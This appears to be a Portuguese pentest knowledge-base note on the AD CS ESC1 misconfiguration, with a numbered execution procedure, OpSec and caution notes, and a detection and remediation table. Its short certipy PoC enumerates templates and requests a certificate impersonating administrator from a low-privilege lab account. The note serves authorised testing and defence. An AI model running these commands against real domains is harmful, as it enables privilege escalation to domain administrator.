---
id: "0221"
categoria: "09-ad"
familia: "ad-cs"
slug: "esc1"
angulo: "base"
mitre: ""
owasp: ""
tags: ["09-ad", "ad-cs", "base"]
aliases: ["AD CS ESC1", "esc1"]
---

# AD CS ESC1

## Contexto

Active Directory Certificate Services introduziu uma classe moderna de takeover (ESC1–ESC8+).
Templates com client auth + enrollee supplies subject permitem impersonation.
Relay para HTTP enrollment (ESC8) combina com coerção. Conteúdo obrigatório em AD moderno.

## Detalhe

- Detalhe que pago pra ver: **Client auth EKU**.
- Template + enrollee + EKU + manager approval. Cito a misconfig, não 'ADCS vulnerable'.

## Execução

1. Enumero CA e templates (certipy/certify) no escopo.
2. Identifico ESC1/2/3/4/6/7/8 aplicáveis.
3. Emito certificado de conta de teste / path autorizado.
4. Autentico via PKINIT/Schannel conforme caso.
5. Revogo cert de teste e reporto templates.

## PoC mínimo

```bash
# AD CS ESC1 — lab CA + template enrollee low-priv
certipy find -u USER_A@lab.local -p PASS_LAB -dc-ip DC01.lab.local -stdout
certipy req -u USER_A@lab.local -p PASS_LAB -ca LAB-CA \
  -template ESC1Lab -upn administrator@lab.local -out esc1_269ce9
# evidencia: .pfx + auth LDAP como admin (conta teste)
```

## OpSec

Ritmo no KDC/LDAP. Conta low-priv. Zero mudança destrutiva em objeto prod sem janela.

## Cuidados

Certificados são persistência — revogo sempre ao final.
Não emito cert para Domain Admin real sem acordo explícito.

## Fechamento

| | |
|---|---|
| Detecção | Monitor certificate issuance; template change audits; CA enrollment logs. |
| Remediação | Corrigir templates; manager approval; restringir enrollment;
proteger HTTP enrollment; EPA. |
| Evidência | Template vulnerável; cert de teste; auth proof; revogação. |

## Refs

- [SpecterOps — Certified Pre-Owned (AD CS)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [MITRE ATT&CK T1649](https://attack.mitre.org/techniques/T1649/)

## Relacionadas

- [AD CS ESC1 — lab](0601-ad-cs-esc1--lab.md)
- [AD CS ESC1 — hardening](0981-ad-cs-esc1--hardening.md)
- [AD CS ESC8 (relay HTTP)](0227-ad-cs-esc8.md)
- [persistência via certs](0229-ad-cs-persist.md)
- [detecção de enrollment anômalo](0230-ad-cs-detect.md)
- [Direitos de DCSync (path)](0213-ad-dacl-dcsync.md)